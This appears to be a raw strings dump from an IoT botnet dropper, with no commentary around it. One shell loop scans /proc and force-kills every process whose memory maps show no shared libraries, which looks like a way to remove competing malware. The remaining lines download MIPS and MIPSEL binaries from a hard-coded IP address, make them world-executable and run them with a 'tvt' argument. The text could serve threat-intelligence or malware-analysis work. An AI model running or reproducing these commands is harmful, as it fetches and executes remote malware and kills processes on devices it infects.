strings: for pid in /proc/[0-9]*; do pid_num="${pid##*/}"; if [ -r "$pid/maps" ]; then suspicious=true; while IFS= read -r line; do case "$line" in *"/lib/"*|*"/lib64/"*|*".so"*) suspicious=false; break;; esac; done < "$pid/maps"; if [ "$suspicious" = true ]; then kill -9 "$pid_num"; fi; fi; done
wget http://103.176.20.59/mips || busybox wget http://103.176.20.59/mips; chmod 777 mips; ./mips tvt;
wget http://103.176.20.59/mpsl || busybox wget http://103.176.20.59/mpsl; chmod 777 mpsl; ./mpsl tvt;
